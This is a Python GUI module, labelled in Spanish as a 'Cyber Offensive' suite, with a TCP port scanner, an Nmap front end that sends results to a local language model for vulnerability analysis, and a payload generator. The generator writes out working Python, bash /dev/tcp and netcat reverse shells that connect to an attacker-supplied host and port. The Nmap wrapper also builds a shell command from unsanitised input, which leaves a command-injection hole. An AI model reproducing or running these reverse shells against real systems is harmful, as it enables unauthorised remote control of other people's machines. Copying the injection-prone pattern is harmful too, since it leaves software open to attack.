import customtkinter as ctk
import socket
import subprocess
import threading
import time

from .base_module import BaseModule
from .shared import ToolFrameContainer


class HackingModule(BaseModule):
    name = "Cyber Offensive"
    icon = "💀"
    description = "Suite de herramientas ofensivas"

    def build(self, parent):
        colors = self.colors
        self._build_tool_cards(parent, [
            ("Port Scanner", "Escaneo de puertos TCP", self.port_scanner, "🔍"),
            ("Payload Generator", "Generador de payloads reversos", self.payload_gen, "💉"),
            ("Nmap GUI", "Interfaz gráfica para Nmap", self.nmap_gui, "🗺️"),
        ])

    def port_scanner(self):
        app = self.app
        app.clear_content()
        win = ToolFrameContainer(app.content_frame, "Port Scanner", self.build, self.colors)
        win.pack(fill="both", expand=True)

        target = ctk.CTkEntry(win, placeholder_text="IP o dominio", width=300)
        target.pack(pady=10)
        ports = ctk.CTkEntry(win, placeholder_text="Puertos (ej: 1-1000 o 22,80,443)", width=300)
        ports.pack(pady=10)

        progress = ctk.CTkProgressBar(win, progress_color=self.colors["accent"])
        progress.pack(fill="x", padx=20, pady=5)
        progress.set(0)

        output = ctk.CTkTextbox(win, height=300)
        output.pack(pady=10, padx=20, fill="both", expand=True)

        def scan():
            ip = target.get()
            port_range = ports.get()
            if not ip or not port_range:
                return
            output.delete("1.0", "end")
            output.insert("end", f"Escaneando {ip}...\n")
            progress.set(0)

            def run():
                open_ports = []
                try:
                    if '-' in port_range:
                        start, end = map(int, port_range.split('-'))
                        ports_to_scan = list(range(start, min(end+1, 65535)))
                    else:
                        ports_to_scan = [int(p.strip()) for p in port_range.split(',')]
                except:
                    app.after(0, lambda: output.insert("end", "\n[!] Rango de puertos inválido.\n"))
                    return

                for idx, port in enumerate(ports_to_scan):
                    if not win.winfo_exists():
                        return
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.15)
                    result = sock.connect_ex((ip, port))
                    app.after(0, lambda val=float(idx+1)/len(ports_to_scan): progress.set(val))
                    if result == 0:
                        open_ports.append(port)
                        app.after(0, lambda p=port: output.insert("end", f"  [+] Puerto {p:5} - ABIERTO\n"))
                    sock.close()

                app.after(0, lambda: output.insert("end", f"\n[!] Completado. Puertos abiertos: {open_ports}"))

            threading.Thread(target=run, daemon=True).start()

        ctk.CTkButton(win, text="Escanear", command=scan, fg_color=self.colors["accent"]).pack(pady=10)

    def payload_gen(self):
        app = self.app
        app.clear_content()
        win = ToolFrameContainer(app.content_frame, "Payload Generator", self.build, self.colors)
        win.pack(fill="both", expand=True)

        lhost = ctk.CTkEntry(win, placeholder_text="LHOST (IP atacante)", width=300)
        lhost.pack(pady=5)
        lport = ctk.CTkEntry(win, placeholder_text="LPORT", width=300)
        lport.pack(pady=5)
        output = ctk.CTkTextbox(win, height=300)
        output.pack(pady=10, padx=20, fill="both", expand=True)

        def generate():
            host = lhost.get()
            port = lport.get()
            if not host or not port:
                return
            payloads = [
                f"# Python Reverse Shell\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('{host}',{port}))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])",
                f"# Bash Reverse Shell\nbash -i >& /dev/tcp/{host}/{port} 0>&1",
                f"# Netcat Reverse Shell\nnc -e /bin/sh {host} {port}"
            ]
            output.delete("1.0", "end")
            output.insert("end", "\n\n".join(payloads))
            app.toast.show("Payloads generados", type="success")

        ctk.CTkButton(win, text="Generar", command=generate, fg_color=self.colors["accent"]).pack(pady=10)

    def nmap_gui(self):
        app = self.app
        app.clear_content()
        win = ToolFrameContainer(app.content_frame, "Nmap Scanner", self.build, self.colors)
        win.pack(fill="both", expand=True)

        target = ctk.CTkEntry(win, placeholder_text="Target (IP o dominio)", width=400)
        target.pack(pady=10)

        progress = ctk.CTkProgressBar(win, progress_color=self.colors["accent"])
        progress.pack(fill="x", padx=20, pady=5)
        progress.set(0)

        output = ctk.CTkTextbox(win, height=250)
        output.pack(pady=10, padx=20, fill="both", expand=True)

        def scan():
            ip = target.get()
            if not ip:
                return
            output.delete("1.0", "end")
            output.insert("end", f"Iniciando escaneo Nmap en {ip}...\n")
            progress.set(0.1)

            def run():
                try:
                    app.after(0, lambda: progress.set(0.4))
                    result = subprocess.run(f"nmap -sV {ip}", shell=True, capture_output=True, text=True, timeout=30)
                    app.after(0, lambda: progress.set(1.0))
                    app.after(0, lambda: output.insert("end", result.stdout))
                except:
                    app.after(0, lambda: progress.set(1.0))
                    app.after(0, lambda: output.insert("end", "Error: Nmap no instalado"))

            threading.Thread(target=run, daemon=True).start()

        btn_frame = ctk.CTkFrame(win, fg_color="transparent")
        btn_frame.pack(pady=10)

        ctk.CTkButton(btn_frame, text="Escanear", command=scan, fg_color=self.colors["accent"], width=150).pack(side="left", padx=5)

        def audit_with_ai():
            text = output.get("1.0", "end-1c").strip()
            if not text or "Escaneando" in text or "Error:" in text or "Iniciando" in text:
                app.toast.show("No hay resultados de Nmap", type="error")
                return
            app.toast.show("Auditando con IA...", type="info")
            output.delete("1.0", "end")
            output.insert("1.0", "🤖 Analizando resultados...\n\n")

            def run():
                prompt = f"Analiza estos resultados de Nmap buscando vulnerabilidades y puertos de riesgo:\n\n{text}"
                response = app.ollama.generate(prompt)
                app.after(0, lambda: output.winfo_exists() and (output.delete("1.0", "end") or output.insert("1.0", response)))
                app.after(0, lambda: app.toast.show("Auditoría completada", type="success"))

            threading.Thread(target=run, daemon=True).start()

        ctk.CTkButton(btn_frame, text="🤖 Auditoría IA", command=audit_with_ai, fg_color=self.colors["accent_light"], width=150).pack(side="left", padx=5)
